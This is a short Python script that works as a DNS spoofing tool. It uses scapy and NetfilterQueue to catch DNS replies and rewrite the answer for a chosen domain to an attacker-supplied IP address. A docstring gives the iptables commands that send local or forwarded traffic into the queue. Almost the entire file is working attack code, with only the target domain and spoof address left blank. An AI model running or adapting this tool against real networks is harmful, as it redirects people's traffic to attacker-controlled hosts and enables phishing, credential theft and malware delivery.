#!/usr/bin/python3

import scapy.all as scapy
from netfilterqueue import NetfilterQueue

"""
you have to create a queue to intercept or drop packet, you can't do it with scapy
that's why we imported netilter queue and we have to configure our iptable rules
for local intercepting = iptables -I OUTPUT -j NFQUEUE --queue-num 0
                         iptables -I INPUT -j NFQUEUE --queue-num 0
for remote intercepting = iptables -I FORWARD -j NFQUEUE --queue-num 0
after your execution you have to wipe out the iptable rules that you've created
you can do it with this command = iptables --flush
"""

def processing_dns_spoof(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = str(scapy_packet[scapy.DNSQR].qname)
        qname = qname.split("'")[1]
        if domain in qname:
            print("[+] Spoofing target...")
            answer = scapy.DNSRR(rrname=qname, rdata=spoof_ip)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(bytes(scapy_packet))

    packet.accept()

domain = ""
spoof_ip = ""

queue = NetfilterQueue()
queue.bind(0, processing_dns_spoof)
queue.run()